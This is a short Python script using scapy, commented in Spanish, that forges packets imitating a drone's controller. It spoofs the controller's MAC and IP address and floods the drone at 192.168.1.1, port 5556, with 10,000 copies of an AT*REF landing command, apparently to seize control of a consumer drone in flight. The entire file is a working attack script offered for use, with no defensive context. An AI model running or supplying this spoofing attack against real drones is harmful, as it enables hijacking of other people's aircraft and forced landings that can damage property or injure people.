from scapy.all import *
from time import sleep

if len(sys.argv) < 4:
	print "Formato: sudo python at_spoof.py ip_dispositivo MAC_dispositivo MAC_dron"
	exit()
else:
	patron_ip = re.compile('\d{0,255}\.\d{0,255}\.\d{0,255}\.\d{0,255}')
	patron_mac = re.compile('[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}')
	if patron_ip.match(sys.argv[1]) is None or patron_mac.match(sys.argv[2]) is None or patron_mac.match(sys.argv[3]) is None:
		print "Formato: sudo python at_spoof.py ip_dispositivo MAC_dispositivo MAC_dron"
		exit()



srcIP = sys.argv[1] # Ip del dispositivo
dstIP = '192.168.1.1' # IP del dron
srcPort = 5556 # Puerto origen
dstPort = 5556 # Puerto destino

srcMAC = sys.argv[2] # MAC del dispositivo
dstMAC = sys.argv[3] # MAC del dron

at_ref_basic_code= 2 ** 28 + 2 ** 24 + 2 ** 22 + 2 ** 20 + 2 ** 18
at_land_code = at_ref_basic_code
at_take_off_code = at_ref_basic_code + 2 ** 9

payload = "AT*REF=1,"+str(at_land_code)+"\r"

spoofed_packet =  Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
for i in range(10000):
	sendp(spoofed_packet, iface="wlan0")